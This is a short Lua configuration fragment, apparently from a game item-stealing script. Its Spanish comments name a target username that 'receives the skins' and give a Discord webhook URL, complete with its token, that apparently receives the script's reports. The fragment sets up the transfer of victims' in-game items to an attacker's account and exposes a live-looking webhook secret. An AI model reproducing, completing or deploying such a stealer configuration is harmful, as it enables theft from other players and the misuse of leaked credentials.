local CONFIG = {
    ...
    TARGET_NAME   = "iiddeennx", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1551628019683172352/50VYrhyYWGZeynTV1ZpqhL2sHJatmTeSVKpg1PJQ10KzKOrQmUHbVC-XGFGXRraZ1q6i", -- "https://discord.com/api/webhooks/" webhook de Discord
